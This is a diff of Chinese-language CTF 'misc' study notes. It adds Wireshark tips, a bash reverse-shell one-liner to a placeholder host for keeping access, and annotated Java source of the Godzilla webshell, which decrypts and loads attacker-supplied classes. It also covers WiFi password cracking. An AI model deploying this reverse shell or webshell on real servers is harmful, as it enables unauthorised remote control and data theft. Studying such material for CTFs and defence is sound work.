@@ -82,6 +82,23 @@ binwalk -e xx.xx
 
 有终端显示为中文的字节可以使用CyberChef查看
 
+### Wireshark
+
+- 跟踪流的编号查看是否有可疑数据
+- 选择原始数据另存为，即使包含其他数据也可解压
+
+### Linux
+
+```bash
+# 反向shell连接-维持权限
+bash -i > & /dev/tcp/x.x.x.x/port 0 > &1
+# -i 交互式
+# > & 将标准输出与标准错误重定向, 通过tcp协议连接到目标地址端口
+# 标准输入重定向到标准输出
+```
+
+
+
 ## 基础知识
 
 **常见文件头**
@@ -170,7 +187,7 @@ JPEG文件头：`ffd8 ffe0 0010 4a46 4946`，一般以`ÿØÿà..JFIF`开头
 
 JPG包含`JFIF`与`Exif`两种文件结构
 
-**更改大小：**可以在010editor中查看以下两个选项
+**更改大小**：可以在010editor中查看以下两个选项
 
 ![img](/img/misc_note.zh-cn.assets/-17284513528792.assets)
 
@@ -210,7 +227,7 @@ for i in range(2000):
 
 ### 摩尔斯电码
 
-**破译网址：**`https://www.ip138.com/mosi/`，可结合**长短音**，只破译字母和数字，若有其他符号，参考wiki
+**破译网址**：`https://www.ip138.com/mosi/`，可结合**长短音**，只破译字母和数字，若有其他符号，参考wiki
 
 ### 压缩文件
 
@@ -338,7 +355,7 @@ for i in tmp:
 
 ### WIFI
 
-协议：**802.11**，WPA或WEP加密后数据包
+协议**：802.11**，WPA或WEP加密后数据包
 
 ```bash
 # kali
@@ -350,6 +367,62 @@ $ aircrack-ng xxx.cap
 **无线握手包WIFI密码破解**
 
 `https://hashcat.net/cap2hashcat/`在线将`.cap`文件转换为`.hc22000`格式用于`hashcat`破解密码
+
+### 哥斯拉
+
+webshell管理工具，生成免杀木马，包括base64以及md5函数等
+
+```java
+String xc = "key";
+String pass = "password";
+String md5 = md5(pass + xc);
+
+class X extends ClassLoader {
+    public X(ClassLoader z) { // JAVA类通过类加载器ClassLoader动态加载到JVM中
+        super(z); // X类继承父类ClassLoader z的特性
+    }
+
+    public Class Q(byte[] cb) { // 接收字节码
+        // 调用父类的defineClass将字节码转换成定义一个类对象，构造恶意类
+        return super.defineClass(cb, 0, cb.length);
+    }
+}
+// 对字节数组加密或解密
+public byte[] x(byte[] s, boolean m) {
+    try {
+        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+        // init初始化Cipher对象c, 指定密钥xc, 使用AES, 1加密2解密
+        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
+        return c.doFinal(s); // 执行加解密操作
+    } catch (Exception e) {
+        return null;
+    }
+}
+try {
+        byte[] data = base64Decode(request.getParameter(pass)); // base64解码pass
+        data = x(data, false); // 将data解密
+        if (session.getAttribute("payload") == null) {
+            // 代码第一次运行，创建自定义类加载器实例，data解析为JAVA类，存储到session的payload中
+            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
+        } else {
+            // data存储在http请求的parameters中
+            request.setAttribute("parameters", data);
+            // 可写入字节数据的输出流
+            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+            // 将session中的payload强制转换为Class类型，调用反射方法实例化对象
+            Object f = ((Class) session.getAttribute("payload")).newInstance();
+            f.equals(arrOut);
+            f.equals(pageContext);
+            // 获取响应对象的输出流
+            response.getWriter().write(md5.substring(0, 16));
+            f.toString();
+            // 将流中字节数据转换成字节数组AES加密且base64编码后写入HTTP响应量
+            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
+            response.getWriter().write(md5.substring(16));
+        }
+    } catch (Exception e) {
+}
+```
 
 
 
@@ -420,7 +493,7 @@ pic.save("flag.png")
 **txt零宽度隐写**
 
 - 零宽度字符：隐藏、不显示、不可打印，大部分程序和编辑器是看不到这种字符，用于调整字符的显示格式
-- **隐藏：**需要被加密的内容转换为二进制（Morse编码），该二进制（Morse编码）将被转换为一系列零宽度字符，即可将零宽度的字符串不可见地插入正常文本中隐藏
+- **隐藏**：需要被加密的内容转换为二进制（Morse编码），该二进制（Morse编码）将被转换为一系列零宽度字符，即可将零宽度的字符串不可见地插入正常文本中隐藏
 
 `https://yuanfux.github.io/zero-width-web/`进行加解密，`vim`可能可以看到零宽度字符
 
